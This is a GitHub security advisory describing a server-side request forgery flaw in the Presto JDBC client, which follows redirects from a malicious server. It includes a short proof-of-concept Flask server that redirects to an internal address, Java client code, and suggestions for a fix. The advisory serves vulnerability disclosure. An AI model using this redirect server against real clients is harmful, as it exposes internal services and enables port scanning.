# [H] Presto JDBC Server-Side Request Forgery by redirect

## Summary
Severity: High
Advisory: GHSA-xm7x-f3w2-4hjm
CWE: CWE-918
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2023-10-03
Source: https://github.com/advisories/GHSA-xm7x-f3w2-4hjm
Type: github-advisory

## Affected
- Maven: `com.facebook.presto:presto-jdbc` — affected >=0

## Details
### Summary

Presto JDBC is vulnerable to Server-Side Request Forgery (SSRF) when connecting a remote Presto server. An attacker can construct a redirect response that Presto JDBC client will follow and view sensitive information from highly sensitive internal servers or perform a local port scan. 

### Details

Presto JDBC client uses OkHttp to send `POST /v1/statement` and `GET /v1/info` requests to the remote Presto server. And OkHttp will follow 301 and 302 redirect by default. In addition, JDBC will manually follow 307 and 308 redirect. Therefore, if a malicious server returns a 30x redirect,  JDBC client will follow the redirect and cause SSRF.

For unexpected responses, JDBC will put the response body into the error. So the response of the internal server will be leaked if the server also returns the error directly to the user.

The relevant code is in file path `/presto-client/src/main/java/com/facebook/presto/client/StatementClientV1.java` and function `StatementClientV1` .

The flowchart is as follows:

<img src="https://s2.loli.net/2023/09/18/AhiHNL5neuYIK4X.png" alt="trino_jdbc_ssrf_1.png" style="zoom:50%;" />

### PoC

Running an HTTP service to route POST /v1/statement redirect to the intranet. For example, using these Python code:

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/v1/statement', methods=['POST'])
def redirect_to_interal_server():
    return redirect('http://127.0.0.1:8888', code=302)

if __name__ == '__main__':
    app.run(host="0.0.0.0",port=8000)
```

Connecting to the malicious server using JDBC:

```java
String url = "jdbc:presto://<ip>:<port>";
Properties properties = new Properties();
properties.setProperty("user", "root");
try {
    Connection connection = DriverManager.getConnection(url, properties);
    Statement stmt = connection.createStatement();
    ResultSet res = stmt.executeQuery("show catalogs");
    while(res.next()) {
        System.out.println(res.getString(1));
    }
} catch (Exception e) {
    e.printStackTrace();
}
```

Pwned!

### Impact

When the target remote Presto server to be connected is controllable,  an attacker can view sensitive information from highly sensitive internal servers or perform a local port scan. 

### Others

Regarding the fix suggestions, the redirect issue we can consider directly disable the following redirect. If not, we can add a jdbc parameter such as allowRedirect. Like MySQL JDBC caused arbitrary file reading before, its solution is adding the allowLoadLocalInfile parameters. Disable redirect by default, and there is a need to open. The nextUri issue is similar. If we can only take the path of nextUri instead of the complete URL, join the host and path. If not, add a jdbc parameter too.

I think these two vulnerabilities are worth fixing. There is no effective way to avoid this vulnerability at the server side, and the only way to fix them is modifying the jdbc source code. I think many other vendors also have this issue.

I hope to apply for CVEs and give security thanks in the vulnerability bulletin to prove my work, thank you.

Vulnerability Discovery Credit: Jianyu Li @ WuHeng Lab of ByteDance

## References
- https://github.com/prestodb/presto/security/advisories/GHSA-xm7x-f3w2-4hjm
- https://github.com/prestodb/presto
